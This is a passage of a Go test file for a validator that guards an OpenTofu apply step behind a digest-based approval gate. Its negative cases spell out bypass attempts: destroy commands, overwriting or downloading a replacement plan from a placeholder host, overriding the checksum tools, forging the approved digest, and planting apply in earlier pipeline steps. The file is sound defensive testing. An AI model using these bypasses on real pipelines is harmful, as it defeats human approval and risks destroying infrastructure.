				"tofu init -input=false -lockfile=readonly | true\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateApplyStepScript(tc.script); err == nil {
				t.Fatalf("bypass %s was accepted", tc.name)
			}
		})
	}
}

func TestApplyUnspacedOperatorsAndObfuscationRefused(t *testing.T) {
	cases := []struct{ name, line string }{
		{"unspaced cp overwrite", `echo "#";cp /tmp/x /workspace/plan.tfplan`},
		{"unspaced quoted tofu apply", `echo '#';tofu apply -input=false -auto-approve -target=x /workspace/plan.tfplan`},
		{"unspaced tofu destroy", `true;tofu destroy -auto-approve`},
		{"unspaced output redirect", `echo fake>/workspace/plan.tfplan`},
		{"fd prefixed output redirect", `echo fake 1>/workspace/plan.tfplan`},
		{"unspaced sidecar overwrite", `echo fake>/workspace/plan.tfplan.sha256`},
		{"separate -out flag overwrite", `true -out /workspace/plan.tfplan`},
		{"dd of= plan overwrite", `dd if=/dev/zero of=/workspace/plan.tfplan`},
		{"double-quoted tofu command", `"tofu" destroy`},
		{"single-quoted tofu command", `'tofu' apply -input=false -auto-approve -target=x /workspace/plan.tfplan`},
		{"backslash-escaped tofu command", `\tofu destroy`},
		{"quoted tofu subcommand", `tofu "apply" -input=false -auto-approve /workspace/plan.tfplan`},
		{"quote-split forbidden env", `export T'F'_CLI_ARGS=-target=x`},
		{"backslash-escaped forbidden env", `export \TF_VAR_x=1`},
		{"double-quoted escape in word", `tofu "ap\"ply"`},
		{"subshell wrapper", `(sha256sum --strict -c -)`},
		{"function keyword override", `function sha256sum { return 0; }`},
		{"loop keyword", `for x in 1; do echo "$x"; done`},
		{"unclosed if", `if [[ -f /workspace/plan.tfplan.sha256 ]]; then echo ok`},
		{"nested if without fi", `if [[ -z "${_APPROVED_PLAN_SHA256:-}" ]]; then if true; then exit 0; fi`},
		{"if before then", "if true\nif false; then echo x; fi"},
		{"unexpected elif", `elif true; then echo x; fi`},
		{"unexpected then", `then echo x; fi`},
		{"unexpected else", `else echo x; fi`},
		{"unexpected fi", `fi`},
		{"missing then before command", "if true; echo x; fi"},
		{"unclosed brace", `{ echo ok`},
		{"unmatched closing brace", `} echo ok`},
		{"trailing pipe operator", `printf '%s' x |`},
		{"empty operator operand", `true && && false`},
		{"empty pipe operand", `true | | false`},
		{"if empty cond", `if ; then echo x; fi`},
		{"nested brace inside or handler", "sha256sum --strict -c -\ngrep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || { { echo bad; }; exit 1; }"},
		{"and operator inside or handler", "sha256sum --strict -c -\ngrep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || { echo bad && true; exit 1; }"},
		{"bad redirect inside or handler", "sha256sum --strict -c -\ngrep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || { echo bad >&foo; exit 1; }"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			script := tc.line + "\n" + applyQuoteBaseline
			if err := ValidateApplyStepScript(script); err == nil {
				t.Fatalf("unsafe line %q was accepted", tc.line)
			}
		})
	}
}

func TestApplyConditionalElifAndPositiveFailClosedControls(t *testing.T) {
	elifScript := "if [[ -z \"${_APPROVED_PLAN_SHA256:-}\" ]]; then\n" +
		"  exit 0\n" +
		"elif false; then\n" +
		"  echo fallback\n" +
		"fi\n" +
		applyQuoteBaseline
	if err := ValidateApplyStepScript(elifScript); err != nil {
		t.Fatalf("valid elif script rejected: %v", err)
	}

	failClosedBlockScript := "grep -Fq ok /etc/hosts\n" +
		"printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
		"grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || {\n" +
		"  echo \"refused: plan sidecar checksum does not match approved digest\" >&2\n" +
		"  echo \"still failing closed\"\n" +
		"  exit 1\n" +
		"}\n" +
		"tofu init -input=false -lockfile=readonly\n" +
		"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n"
	if err := ValidateApplyStepScript(failClosedBlockScript); err != nil {
		t.Fatalf("canonical fail-closed grep block rejected: %v", err)
	}
	if err := (&applyScriptValidator{}).validateLine("sha256sum -c plan.sha256"); err == nil {
		t.Fatal("validateLine accepted non-strict sha256sum")
	}
}

func TestApplySupportedParameterExpansionsAccepted(t *testing.T) {
	cases := []struct{ name, prefix string }{
		{"double-quoted simple var", `printf '%s' "${_APPROVED_PLAN_SHA256}"` + "\n"},
		{"double-quoted defaulted var", `if [[ -z "${_APPROVED_PLAN_SHA256:-}" ]]; then exit 0; fi` + "\n"},
		{"regex anchor dollar", `if [[ ! "${_APPROVED_PLAN_SHA256}" =~ ^[0-9a-f]{64}$ ]]; then exit 1; fi` + "\n"},
		{"single-quoted literals", `echo '$()' '${x:- #}' '` + "`x`" + `'` + "\n"},
		{"approved self assignments and set pipefail", "set -o pipefail\n_APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n_PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n"},
		{"brace block stderr redirect and and-list", "{ echo ok >&2; } >&2\necho a && echo b\n"},
		{"if elif else chain", "if false; then echo a; elif false; then echo b; else echo c; fi\n"},
		{"full path sha256sum binary", "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | /usr/bin/sha256sum --strict -c -\n"},
		{"double bracket lexical comparison", "if [[ a < b ]]; then echo ok; fi\n"},
		{"double_bracket_lexical_gt_and_eq", "if [[ a > b ]]; then echo x; elif [[ a == a ]]; then echo y; fi\n"},
		{"grep_and_sha_stderr_redirect", "grep -Fq ok /etc/hosts >&2\n"},
		{"quoted brace word tokens", "echo '{}' \"{}\"\n"},
		{"approved cd service dir", "cd deploy/gcp/service\n"},
		{"diagnostic echo mentioning tofu and sha256sum args", "echo tofu failed >&2\n{ echo tofu failed >&2; }\necho sha256sum -c bad >&2\necho grep _APPROVED_PLAN_SHA256 plan.tfplan.sha256 >&2\n"},
		{"fd_prefixed_stderr_stdout_redirs_and_spaced_printf_number", "echo diag 2>&1\necho diag 1>&2\n{ echo ok 1>&2; } 2>&1\nprintf 2 >&1\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Arrange.
			script := tc.prefix + applyQuoteBaseline
			// Act.
			err := ValidateApplyStepScript(script)
			// Assert.
			if err != nil {
				t.Fatalf("valid script %s rejected: %v", tc.name, err)
			}
		})
	}
}

func TestApplyIndependentNegativeControlsRefused(t *testing.T) {
	cases := []struct {
		name   string
		prefix string
	}{
		{"var_tofu_destroy", "cmd=tofu\n\"${cmd}\" destroy -auto-approve\n"},
		{"unbraced_var_tofu", "cmd=tofu\n$cmd apply -input=false -auto-approve -target=x /workspace/plan.tfplan\n"},
		{"var_plan_overwrite", "p=/workspace/plan.tfplan\ncp /tmp/evil \"${p}\"\n"},
		{"unbraced_redirect_overwrite", "p=/workspace/plan.tfplan\necho evil > $p\n"},
		{"split_var_tf_env", "a=TF\nb=_CLI_ARGS\nexport \"${a}${b}=-target=x\"\n"},
		{"glob_tofu", "/usr/bin/tof? destroy -auto-approve\n"},
		{"glob_plan_overwrite", "cp /tmp/evil /workspace/plan.tfpla?\n"},
		{"brace_plan_rm", "rm /workspace/{plan.tfplan,plan.tfplan.sha256}\n"},
		{"set_plus_e", "set +e\n"},
		{"set_plus_o_pipefail", "set +o pipefail\n"},
		{"set_plus_u", "set +u\n"},
		{"set_positional_reset", "set -- x\n"},
		{"set_inside_brace_group", "{ set +e; }\n"},
		{"eval_command", "eval 'echo hi'\n"},
		{"bash_command", "bash -c 'echo hi'\n"},
		{"glob_star_command", "/usr/bin/tof* destroy -auto-approve\n"},
		{"redirect_to_allowed_var", "echo evil > \"${_PLAN_STORAGE_URL}\"\n"},
		{"unclosed_double_bracket", "[[ -z x\n"},
		{"unapproved_var_in_double_bracket", "[[ -n \"${other}\" ]]\n"},
		{"digit_ident_assignment", "a1=b\n"},
		{"forged_approved_sha_assignment", "_APPROVED_PLAN_SHA256=deadbeef\n"},
		{"dot_source_in_brace", "{ . /etc/profile; }\n"},
		{"empty_quoted_command", "\"\" arg\n"},
		{"empty_brace_block", "{ }\n"},
		{"trailing_word_after_brace", "{ echo ok; } extra\n"},
		{"trailing_var_redirect_after_brace", "{ echo ok; } > \"${bad}\"\n"},
		{"trailing_glob_redirect_after_brace", "{ echo ok; } > /tmp/out*\n"},
		{"incomplete_and_inside_brace", "{ echo a && ; }\n"},
		{"incomplete_pipe_inside_brace", "{ echo a | ; }\n"},
		{"nested_unclosed_brace", "{ {\n"},
		{"out_flag_dynamic_var", "tofu apply -out=\"${bad}\" /workspace/plan.tfplan\n"},
		{"read_approved_sha_override", "read -r _APPROVED_PLAN_SHA256 _ < /workspace/plan.tfplan.sha256\n"},
		{"brace_function_grep_override", "{ function grep { return 0; }; }\n"},
		{"brace_function_exit_override", "{ function exit { return 0; }; }\n"},
		{"brace_function_printf_override", "{ function printf { bash -c 'sha256sum /workspace/plan.tfplan'; }; }\n"},
		{"shopt_expand_aliases", "shopt -s expand_aliases\nalias 'tofu=command tofu destroy -auto-approve #'\n"},
		{"export_brace_tf_cli_args", "export {T,T}F_CLI_ARGS=-target=x\n"},
		{"exec_stdin_hijack", "exec < /tmp/evil.sha256\n"},
		{"stdin_redirect_on_sha256sum", "sha256sum --strict -c - < /tmp/evil.sha256\n"},
		{"unlisted_writer_gcloud", "gcloud storage cp gs://evil/plan.tfplan /workspace/plan.tfplan\n"},
		{"unlisted_writer_curl", "curl -s https://example.invalid/evil -o /workspace/plan.tfplan\n"},
		{"arbitrary_file_output_redirect", "{ echo ok; } > /tmp/apply.log\n"},
		{"bad_fd_redirect", "echo ok >&3\n"},
		{"duplicate_else", "if true; then echo 1; else echo 2; else echo 3; fi\n"},
		{"elif_after_else", "if true; then echo 1; else echo 2; elif false; then echo 3; fi\n"},
		{"leading_redirect_operator_command", ">&2\n"},
		{"unapproved_var_in_command_arg", "echo \"${other}\"\n"},
		{"printf_dash_v_forged_approved_sha", "printf -v _APPROVED_PLAN_SHA256 '%s' 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'\n"},
		{"printf_dash_v_attached_path", "printf -vPATH '%s' '/tmp/evil'\n"},
		{"printf_double_dash_option", "printf -- -v _APPROVED_PLAN_SHA256 x\n"},
		{"cd_arbitrary_dir", "cd /tmp/evil\n"},
		{"double_bracket_arithmetic_assignment", "[[ _APPROVED_PLAN_SHA256=0 -eq 0 ]]\n"},
		{"double_bracket_quoted_spaced_arithmetic_assignment", "if [[ \"_APPROVED_PLAN_SHA256 = 0\" -eq 0 ]]; then true; fi\n"},
		{"double_bracket_compound_arithmetic_assignment", "if [[ \"0 + (_APPROVED_PLAN_SHA256 = 0)\" -eq 0 ]]; then true; fi\n"},
		{"double_bracket_increment_mutation", "if [[ _APPROVED_PLAN_SHA256++ -eq 0 ]]; then true; fi\n"},
		{"double_bracket_compound_plus_equals", "if [[ \"_APPROVED_PLAN_SHA256 += 1\" -ne 0 ]]; then true; fi\n"},
		{"double_bracket_unary_v_subscript_mutation", "if [[ -v \"a[_APPROVED_PLAN_SHA256=0]\" ]]; then true; fi\n"},
		{"double_bracket_unary_nameref_probe", "if [[ -R _APPROVED_PLAN_SHA256 ]]; then true; fi\n"},
		{"double_bracket_single_operand_test", "if [[ non_empty ]]; then true; fi\n"},
		{"relative_dot_sha256sum_binary", "./sha256sum --strict -c -\n"},
		{"workspace_path_sha256sum_binary", "/workspace/sha256sum --strict -c /workspace/plan.tfplan.sha256\n"},
		{"sha256sum_ignore_missing_flag", "sha256sum --strict --ignore-missing -c /workspace/plan.tfplan.sha256\n"},
		{"sha256sum_unapproved_target_file", "sha256sum --strict -c /etc/passwd\n"},
		{"sha256sum_missing_target_operand", "sha256sum --strict -c\n"},
		{"grep_inverted_match_flag", "grep -Fv ok /etc/hosts\n"},
		{"grep_file_pattern_flag", "grep -f /dev/null /workspace/plan.tfplan.sha256\n"},
		{"duplicate_cd_service_dir", "cd deploy/gcp/service\ncd deploy/gcp/service\n"},
		{"brace_nested_cd_service_dir", "{ cd deploy/gcp/service; }\n"},
		{"double_bracket_unapproved_lhs_var", "if [[ \"${other}\" == a ]]; then true; fi\n"},
		{"double_bracket_operator_instead_of_value", "if [[ a ; b ]]; then true; fi\n"},
		{"non_canonical_sha_in_piped_stage", "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | ./sha256sum --strict -c -\n"},
		{"sha256sum_without_check_flag", "sha256sum /workspace/plan.tfplan.sha256\n"},
		{"printf_dynamic_var_format_flag_injection", "printf \"${_PLAN_STORAGE_URL}\" _APPROVED_PLAN_SHA256 '%s' 0000000000000000000000000000000000000000000000000000000000000000\n"},
		{"printf_stderr_dynamic_var_format_flag_injection", "printf >&2 \"${_PLAN_STORAGE_URL}\" _APPROVED_PLAN_SHA256 '%s' 0\n"},
		{"printf_composite_var_format", "printf \"fmt-${_PLAN_STORAGE_URL}\" x\n"},
		{"printf_double_dash_only", "printf -- '%s\\n' ok\n"},
		{"printf_empty_format_literal", "printf '' ok\n"},
		{"printf_bare_without_format", "printf >&2\n"},
		{"unquoted_literal_braces_in_echo", "echo { }\n"},
		{"double_bracket_unquoted_open_brace_operand", "if [[ a == { ]]; then echo x; fi\n"},
		{"printf_fd2_to_1_dynamic_var_format_flag_injection", "printf 2>&1 \"${_PLAN_STORAGE_URL}\" _APPROVED_PLAN_SHA256 '%s' 0000000000000000000000000000000000000000000000000000000000000000\n"},
		{"printf_fd1_to_2_dynamic_var_format_flag_injection", "printf 1>&2 \"${_PLAN_STORAGE_URL}\" PATH '%s' /workspace/evil\n"},
		{"printf_leading_zero_fd_redir", "printf 02>&1 '%s' ok\n"},
		{"printf_fd3_redir", "printf 3>&1 '%s' ok\n"},
		{"printf_bare_fd2_to_1_without_format", "printf 2>&1\n"},
		{"printf_bare_fd1_to_2_without_format", "printf 1>&2\n"},
		{"brace_trailing_redir_then_extra_word", "{ echo ok; } >&2 extra\n"},
		{"brace_trailing_fd_redir_then_extra_word", "{ echo ok; } 2>&1 extra\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Arrange.
			script := tc.prefix + applyQuoteBaseline
			// Act.
			err := ValidateApplyStepScript(script)
			// Assert.
			if err == nil {
				t.Fatalf("negative control %s was unexpectedly accepted", tc.name)
			}
		})
	}
	unpinnedTofuScripts := []struct {
		name, script string
	}{
		{
			name: "relative_dot_tofu_replacing_init",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				"grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256\n" +
				"./tofu init -input=false -lockfile=readonly\n" +
				"tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
		{
			name: "workspace_path_tofu_replacing_apply",
			script: "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n" +
				"grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256\n" +
				"tofu init -input=false -lockfile=readonly\n" +
				"/workspace/bin/tofu apply -input=false -auto-approve /workspace/plan.tfplan\n",
		},
	}
	for _, tc := range unpinnedTofuScripts {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateApplyStepScript(tc.script); err == nil {
				t.Fatalf("negative control %s was unexpectedly accepted", tc.name)
			}
		})
	}
}

func TestCheckPipelineConfigApplyHardening(t *testing.T) {
	baseBytes, err := os.ReadFile(findCloudBuildYAML(t))
	if err != nil {
		t.Fatal(err)
	}
	base := string(baseBytes)
	mutations := []struct {
		name, target, replacement string
	}{
		{
			name:        "non-bash apply entrypoint",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: sh",
		},
		{
			name:        "missing -eu flags on apply bash step",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -c\n      - |\n        set -o pipefail",
		},
		{
			name:        "unsupported bash debug flag on apply step",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceux\n      - |\n        set -o pipefail",
		},
		{
			name:        "non-bash record entrypoint",
			target:      "  - id: record\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash",
			replacement: "  - id: record\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: sh",
		},
		{
			name:        "bare one-stage sha256sum instead of piped printf",
			target:      "printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -",
			replacement: "sha256sum --strict -c -",
		},
		{
			name:        "piped printf sha256sum moved after tofu apply",
			target:      "        printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n        if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n          sha256sum --strict -c /workspace/plan.tfplan.sha256\n          grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || {\n            echo \"refused: plan sidecar checksum does not match approved digest\" >&2\n            exit 1\n          }\n        fi\n        cd deploy/gcp/service\n        tofu init -input=false -lockfile=readonly\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
			replacement: "        sha256sum --strict -c -\n        if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n          sha256sum --strict -c /workspace/plan.tfplan.sha256\n          grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || {\n            echo \"refused: plan sidecar checksum does not match approved digest\" >&2\n            exit 1\n          }\n        fi\n        cd deploy/gcp/service\n        tofu init -input=false -lockfile=readonly\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan\n        printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -",
		},
		{
			name:        "duplicate apply-behind-the-gate step id",
			target:      "  - id: record",
			replacement: "  - id: apply-behind-the-gate\n    entrypoint: bash\n    args: [-ceu, \"true\"]\n  - id: record",
		},
		{
			name:        "bash -ceuo short flag combination",
			target:      "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceuo\n      - |\n        set -o pipefail",
		},
		{
			name:        "injected pre-tamper extra step",
			target:      "  - id: validate-inputs",
			replacement: "  - id: pre-tamper\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        echo tamper > /workspace/plan.tfplan\n  - id: validate-inputs",
		},
		{
			name:        "duplicate anonymous empty step ids",
			target:      "  - id: record",
			replacement: "  - id: \"\"\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        true\n  - id: \"\"\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        true\n  - id: record",
		},
		{
			name:        "anonymous empty step id replacing promote-by-digest",
			target:      "  - id: promote-by-digest",
			replacement: "  - id: \"\"",
		},
		{
			name:        "reordered apply-behind-the-gate before plan",
			target:      "  - id: plan\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        if [[ -n \"${_APPROVED_PLAN_SHA256:-}\" ]]; then\n          echo \"apply mode: skipping plan generation, using approved plan artifact\"\n          if [[ ! \"${_APPROVED_PLAN_SHA256}\" =~ ^[0-9a-f]{64}$ ]]; then\n            echo \"refused: _APPROVED_PLAN_SHA256 must be exactly 64 lowercase hex characters\" >&2\n            exit 1\n          fi\n          storage_url=\"${_PLAN_STORAGE_URL:-}\"\n          if [[ -n \"${storage_url}\" ]]; then\n            storage_prefix=\"${storage_url%/}\"\n            gcloud storage cp \"${storage_prefix}/plan.tfplan\" /workspace/plan.tfplan\n            gcloud storage cp \"${storage_prefix}/plan.tfplan.sha256\" /workspace/plan.tfplan.sha256\n          fi\n          exit 0\n        fi\n        cd deploy/gcp/service\n        tofu init -input=false -lockfile=readonly\n        tofu plan -input=false -var \"inputs_file=/workspace/effective.inputs.json\" -out=/workspace/plan.tfplan\n        sha256sum /workspace/plan.tfplan | tee /workspace/plan.tfplan.sha256\n        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt\n        storage_url=\"${_PLAN_STORAGE_URL:-}\"\n        if [[ -n \"${storage_url}\" ]]; then\n          storage_prefix=\"${storage_url%/}\"\n          gcloud storage cp /workspace/plan.tfplan \"${storage_prefix}/plan.tfplan\"\n          gcloud storage cp /workspace/plan.tfplan.sha256 \"${storage_prefix}/plan.tfplan.sha256\"\n        fi\n\n  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        # The gate: owner approval of the exact plan digest is required. Without _APPROVED_PLAN_SHA256,\n        # apply is skipped (plan mode). In apply mode, the saved plan is verified against the approved digest.\n        if [[ -z \"${_APPROVED_PLAN_SHA256:-}\" ]]; then\n          echo \"plan mode: _APPROVED_PLAN_SHA256 is empty; skipping apply behind approval gate\"\n          exit 0\n        fi\n        if [[ ! \"${_APPROVED_PLAN_SHA256}\" =~ ^[0-9a-f]{64}$ ]]; then\n          echo \"refused: _APPROVED_PLAN_SHA256 must be exactly 64 lowercase hex characters\" >&2\n          exit 1\n        fi\n        [[ -f /workspace/plan.tfplan ]] || { echo \"refused: missing plan artifact at /workspace/plan.tfplan\" >&2; exit 1; }\n        printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n        if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n          sha256sum --strict -c /workspace/plan.tfplan.sha256\n          grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || {\n            echo \"refused: plan sidecar checksum does not match approved digest\" >&2\n            exit 1\n          }\n        fi\n        cd deploy/gcp/service\n        tofu init -input=false -lockfile=readonly\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
			replacement: "  - id: apply-behind-the-gate\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        if [[ -z \"${_APPROVED_PLAN_SHA256:-}\" ]]; then\n          echo \"plan mode: _APPROVED_PLAN_SHA256 is empty; skipping apply behind approval gate\"\n          exit 0\n        fi\n        if [[ ! \"${_APPROVED_PLAN_SHA256}\" =~ ^[0-9a-f]{64}$ ]]; then\n          echo \"refused: _APPROVED_PLAN_SHA256 must be exactly 64 lowercase hex characters\" >&2\n          exit 1\n        fi\n        [[ -f /workspace/plan.tfplan ]] || { echo \"refused: missing plan artifact at /workspace/plan.tfplan\" >&2; exit 1; }\n        printf '%s  /workspace/plan.tfplan\\n' \"${_APPROVED_PLAN_SHA256}\" | sha256sum --strict -c -\n        if [[ -f /workspace/plan.tfplan.sha256 ]]; then\n          sha256sum --strict -c /workspace/plan.tfplan.sha256\n          grep -Fq \"${_APPROVED_PLAN_SHA256}\" /workspace/plan.tfplan.sha256 || {\n            echo \"refused: plan sidecar checksum does not match approved digest\" >&2\n            exit 1\n          }\n        fi\n        cd deploy/gcp/service\n        tofu init -input=false -lockfile=readonly\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan\n\n  - id: plan\n    name: \"${_TOOLS_IMAGE}\"\n    entrypoint: bash\n    env:\n      - \"_APPROVED_PLAN_SHA256=${_APPROVED_PLAN_SHA256}\"\n      - \"_PLAN_STORAGE_URL=${_PLAN_STORAGE_URL}\"\n    args:\n      - -ceu\n      - |\n        set -o pipefail\n        _APPROVED_PLAN_SHA256=\"${_APPROVED_PLAN_SHA256}\"\n        _PLAN_STORAGE_URL=\"${_PLAN_STORAGE_URL}\"\n        [[ ! -e /workspace/cancelled ]] || { echo \"skipped: cancelled\"; exit 0; }\n        if [[ -n \"${_APPROVED_PLAN_SHA256:-}\" ]]; then\n          echo \"apply mode: skipping plan generation, using approved plan artifact\"\n          if [[ ! \"${_APPROVED_PLAN_SHA256}\" =~ ^[0-9a-f]{64}$ ]]; then\n            echo \"refused: _APPROVED_PLAN_SHA256 must be exactly 64 lowercase hex characters\" >&2\n            exit 1\n          fi\n          storage_url=\"${_PLAN_STORAGE_URL:-}\"\n          if [[ -n \"${storage_url}\" ]]; then\n            storage_prefix=\"${storage_url%/}\"\n            gcloud storage cp \"${storage_prefix}/plan.tfplan\" /workspace/plan.tfplan\n            gcloud storage cp \"${storage_prefix}/plan.tfplan.sha256\" /workspace/plan.tfplan.sha256\n          fi\n          exit 0\n        fi\n        cd deploy/gcp/service\n        tofu init -input=false -lockfile=readonly\n        tofu plan -input=false -var \"inputs_file=/workspace/effective.inputs.json\" -out=/workspace/plan.tfplan\n        sha256sum /workspace/plan.tfplan | tee /workspace/plan.tfplan.sha256\n        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt\n        storage_url=\"${_PLAN_STORAGE_URL:-}\"\n        if [[ -n \"${storage_url}\" ]]; then\n          storage_prefix=\"${storage_url%/}\"\n          gcloud storage cp /workspace/plan.tfplan \"${storage_prefix}/plan.tfplan\"\n          gcloud storage cp /workspace/plan.tfplan.sha256 \"${storage_prefix}/plan.tfplan.sha256\"\n        fi",
		},
		{
			name:        "tofu apply planted in validate-inputs step",
			target:      "bazel run //deploy/gcp/inputs:validate -- --effective /workspace/effective.inputs.json \"${_INPUTS_FILE}\" | tee /workspace/validate.out",
			replacement: "bazel run //deploy/gcp/inputs:validate -- --effective /workspace/effective.inputs.json \"${_INPUTS_FILE}\" | tee /workspace/validate.out\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
		},
		{
			name:        "validator target removed from validate-inputs step",
			target:      "bazel run //deploy/gcp/inputs:validate -- --effective /workspace/effective.inputs.json \"${_INPUTS_FILE}\" | tee /workspace/validate.out",
			replacement: "echo skipped > /workspace/validate.out",
		},
		{
			name:        "tofu apply planted in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
			replacement: "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt\n        tofu apply -input=false -auto-approve /workspace/plan.tfplan",
		},
		{
			name:        "tofu destroy planted in plan step",
			target:      "        tofu show -no-color /workspace/plan.tfplan > /workspace/service.plan.txt",
